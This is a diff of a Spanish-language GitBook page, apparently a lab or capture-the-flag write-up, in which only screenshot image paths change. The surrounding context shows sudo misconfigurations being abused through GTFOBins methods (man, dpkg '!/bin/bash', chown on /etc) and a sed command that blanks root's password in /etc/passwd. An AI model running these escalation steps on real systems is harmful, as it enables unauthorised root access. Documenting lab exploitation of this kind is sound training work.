@@ -88,7 +88,7 @@ sudo -l
 
 para ver si hay algo para explotar.
 
-<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Comprobamos con [GTFOBins ](https://gtfobins.github.io/gtfobins/man/)con permisos **SUDO** en **man**.
 
@@ -99,7 +99,7 @@ sudo -u pingu /usr/bin/man
 
 Ahora somos el usuario **Pingu**.
 
-<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Comprobamos con [GTFOBins ](https://gtfobins.github.io/gtfobins/dpkg/)con permisos **SUDO** en **dpkg**.
 
@@ -108,7 +108,7 @@ sudo -u gladys dpkg -l
 !/bin/bash
 ```
 
-<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Comprobamos con [GTFOBins ](https://gtfobins.github.io/gtfobins/chown/)con permisos **SUDO** en **chown**.
 
@@ -117,4 +117,4 @@ sudo /usr/bin/chown gladys:gladys /etc
 /usr/bin/sed -i 's/root:x:/root::/g' /etc/passwd #no tenemos permisos con nano o vim
 ```
 
-<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
